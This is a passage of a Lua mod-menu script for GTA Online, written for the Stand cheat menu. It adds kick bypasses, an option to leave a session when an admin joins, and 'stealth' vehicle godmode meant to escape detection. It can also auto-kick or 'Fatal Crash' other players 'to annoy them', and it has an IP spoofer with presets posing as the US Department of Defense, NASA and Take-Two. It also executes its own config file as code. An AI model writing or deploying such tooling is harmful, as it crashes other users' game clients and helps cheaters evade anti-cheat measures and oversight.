		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
	end)

end

misc = menu.list(menu.my_root(), "Net Shit", {}, "", function(); end)

--------------------------------------


local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
end

local unreleased_vehicles = {
    "Rhinehart",
    "Sentinel4",
    "Weevil2",
    "tenf2",
}

local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}

local proofs = {
    bullet = {name="Bullets",on=false},
    fire = {name="Fire",on=false},
    explosion = {name="Explosions",on=false},
    collision = {name="Collision",on=false},
    melee = {name="Melee",on=false},
    steam = {name="Steam",on=false},
    drown = {name="Drowning",on=false},
}


local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

local self = menu.list(menu.my_root(), "Protections", {}, "")

local detections = menu.list(menu.my_root(), "Modder Detections", {}, "")

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(self, "Anti-cage protection", {}, "")
local alpha = 160
menu.slider(anticage, "Cage Alpha", {"cagealpha"}, "Cage transparency. If it is at 0 you will not see it", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)


local bypasskick = menu.list(self, "Bypass Kick", {}, "Options that allow you to use methods to n enter the session if you are being blocked.")

menu.divider(bypasskick, "Normal Methods")

menu.toggle(bypasskick, "Method V1", {}, "It gives you a limited time for you to expel the one who blocks you", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        util.toast("Done, all off")
    end
end)

menu.toggle(bypasskick, "Method V2", {}, "A little more functional but also with more network errors", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        util.toast("Done, all off")
    end
end)

menu.toggle(bypasskick, "Method V3", {}, "More functional method, but for developers, you will receive notification of all network events", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
if on_toggle then
    menu.trigger_commands("nobgscript on")
    menu.trigger_command(BlockIncSyncs)
    menu.trigger_command(BlockNetEvents)
    menu.trigger_command(BlockBailing, "on")
    menu.trigger_command(BlockBailing2, "on")
    menu.trigger_command(BlockBailing3, "on")
    menu.trigger_command(BlockBailing4, "on")
    menu.trigger_command(ShowNotis)
    menu.trigger_command(BlockRaw)
    util.toast("Activated, now enter your session and prepare the kick")
else
    menu.trigger_commands("nobgscript off")
    menu.trigger_command(UnblockIncSyncs)
    menu.trigger_command(UnblockNetEvents)
    menu.trigger_command(BlockBailing3, "off")
    menu.trigger_command(UnShowNotis)
    menu.trigger_command(UnBlockRaw)
    util.toast("Done, all off")
end
end)

menu.toggle(bypasskick, "Method V4", {}, "Probably break the game, use at your own risk", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local DontAsk = menu.ref_by_path("Online>Transitions>Speed Up>Don't Ask For Permission To Spawn")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
		menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_command(DontAsk, "on")
        menu.trigger_commands("skipswoopdown on")
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
		menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_command(DontAsk, "off")
        menu.trigger_commands("skipswoopdown off")
        util.toast("Done, all off")
    end
    end)


menu.toggle_loop(self, "Admin Bail", {}, "If it detects an R* admin it changes your session.", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " If there is an admin, for another session.")
        menu.trigger_commands("quickbail")
        return
    end
end


menu.toggle_loop(self, "Block PTFX/Particle Lag", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle_loop(self, "Stealth Vehicle Godmode On", {}, "Won't be detected as vehicle godmode by most menus. Note: Save your profile now to keep it on.", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(self, "Stealth Vehicle Godmode Off", {}, "Turns off Godmode for the vehicle", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), false, false, false, false, false, 0, 0, false)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), true), true, true, true, true, true, 0, 0, true)
end)



menu.toggle_loop(detections, "It's a hacker", {}, "Detects if the player is about to ban", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
            util.draw_debug_text(players.get_name(player_id) .. " They are about to ban him :u, reason:", reason)
                util.toast(players.get_name(pid) .. " Is a hacker!" .. "(" .. name .. ")")
            break
        end
    end
end)

menu.toggle_loop(detections, "It's a hacker Auto Kick", {}, "Detects if the player is about to ban, blocks there joins and breakup kicks them.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
                menu.trigger_commands("block" .. players.get_name(pid))
            util.draw_debug_text(players.get_name(player_id) .. " They are about to ban him :u, reason:", reason)
                util.toast(players.get_name(pid) .. " Is a hacker is being kicked now!" .. "(" .. name .. ")")
            break
        end
    end
end)

menu.toggle_loop(detections, "It's a hacker Auto Crash", {}, "Detects if the player is about to ban, then blocks there joins and sends Fatal Crash to annoy them :).", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
                menu.trigger_commands("fatal" .. players.get_name(pid))
            util.draw_debug_text(players.get_name(player_id) .. " They are about to ban him :u, reason:", reason)
                util.toast(players.get_name(pid) .. " Is a hacker and is being Fatal Crashed!" .. "(" .. name .. ")")
            break
        end
    end
end)


--------------------------------------

focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")

function save()
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..teamchatlabel..'"'..string.char(10)..'allchatlabel = "'..allchatlabel..'"')
	configfile:close()
end


if not filesystem.exists(filesystem.store_dir().."chat_translator//config.txt") then
	filesystem.mkdir(filesystem.store_dir().."chat_translator//")
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..util.get_label_text("MP_CHAT_TEAM")..'"'..string.char(10)..'allchatlabel = "'..util.get_label_text("MP_CHAT_ALL")..'"')
	configfile:close()
	colorselec = 1
else
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt")
	configfiledata = configfile:read("*all")
	configfile:close()
	load(configfiledata)()
end
util.ensure_package_is_installed("lua/ScaleformLib")
local sfchat = require("lib.ScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()

local Languages = {
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}


local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end


local maxpl = menu.list(misc, "Max Players To 32")

menu.slider(maxpl, "Max Players To 32", {"maxplayers"}, "Set the maximum number of players in a session (only works when you are the host)", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
       util.toast("Slots are now free :)")
    end
end)
menu.slider(maxpl, "Max Spectators", {"maxSpectators"}, "Set the maximum number of observers (only works when you are the host)", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("Slots are now free :)")
    end
end)

local chat_trans = menu.list(misc, "Chat Translator")

settingtrad = menu.list(chat_trans, "Settings for traduction")
colortradtrad = menu.list(chat_trans, "PLayer name color")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
selectmenu = menu.action(colortradtrad, "Selectioned : ".."Color : "..colorselec, {}, "this will be saved to a config file", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "this will be saved to a config file", function() 
		menu.set_menu_name(selectmenu, "Selectioned : ".."Color : "..i)
		colorselec = i
		save()
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] translation message", {"labelteam"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] translation message", {"labelall"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.slider_text(chat_trans, "Target Language", {}, "You need to click to aply change", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.slider_text(settingtrad, "Location of Traducted Message", {}, "You need to click to aply change", {"Global Chat networked", "Global Chat not networked", "Team Chat not networked", "Team Chat networked", "Notification"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "Traduct Yourself", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "Traduct even if the language is the same as the desired one", {}, "might not work correctly because google is dumb", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "Use the old method", {}, players.get_name(players.user()).." [ALL] player_sender : their message", function(on)
	oldway = on	
end)
traduct = false
menu.toggle(chat_trans, "Translator On/Off", {}, "", function(on)
	traduct = on
end, false)

traductmymessage = menu.list(chat_trans, "Send Traducted message")
finallangmenu = menu.slider_text(traductmymessage, "Final Language", {"finallang"}, "Final Languge of your message.																	  You need to click to aply change", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "Send Message", {"Sendmessage"}, "Input the text For your message", function(on_click)
    util.toast("Please input your message")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast(players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)


run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end

	menu.action(detections,"Check Stats", {"check stats"}, "Weak",function(on)
			-- modder detection stuff here
			for pid = 0, 31 do
				local rp = players.get_rank(pid)
				local money = players.get_money(pid)
				local kd = players.get_kd(pid)
				if rp == 120 or rp == 720 or rp >= 1000 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded RP", colors.red)
				end
				if money >= 500000000 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded Money", colors.red)
				end
				if kd <= -1 or kd >= 50 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is Weak: Modded KD", colors.red)
				end
			end
	end)


spoofpresets = menu.list(misc, "IP Spoofer Repository", {}, "Stand's default GeoIP may show wrong location on some presets", function(); end)

	menu.action(spoofpresets, "Enable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip on")
	end)

	menu.action(spoofpresets, "Disable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip off")
	end)

	menu.divider(spoofpresets, "Fun IP Presets")

	menu.action(spoofpresets, "Computer Problem Solving (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.146." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "US Department of Defense", {}, "", function()
		menu.trigger_commands("spoofedip " .. "155.21." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "NASA (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.169." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Apple (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "17.234." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Akamai (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "23.66." .. tostring(math.random(16, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "40.89." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.144." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	t2spoofpresets = menu.list(spoofpresets, "Take-Two", {}, "", function(); end)
	
	menu.action(t2spoofpresets, "Take-Two (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.227." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (US)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "192.81." .. tostring(math.random(240, 244)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138." .. tostring(math.random(231, 232)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (AU)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "139.138.226." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138.244." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.233." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (ES)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.247." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.236." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CZ)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.237." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (IN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.224." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (SG)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.228." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.229." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.230." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.238." .. tostring(math.random(0, 255)))
	end)

	menu.divider(spoofpresets, "VPN IP Presets")

	octospoofpresets = menu.list(spoofpresets, "OVH", {}, "", function(); end)

	menu.action(octospoofpresets, "OVH (AU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.99." .. tostring(math.random(232, 234)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(octospoofpresets, "OVH (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "145.239.235." .. tostring(math.random(40, 111)))
	end)

	menu.action(octospoofpresets, "OVH (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.89.208." .. tostring(math.random(88, 95)))
	end)

	menu.action(octospoofpresets, "OVH (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.81.119." .. tostring(math.random(0, 15)))
	end)

	menu.action(octospoofpresets, "OVH (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "192.99.250." .. tostring(math.random(208, 223)))
	end)

	tempestpresets = menu.list(spoofpresets, "Tempest Hosting", {}, "", function(); end)

	menu.action(tempestpresets, "Tempest Hosting (US-NY)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (US-CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(0, 127)))
	end)
	
	menu.action(tempestpresets, "Tempest Hosting (US-FL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (UK)", {}, "", function()
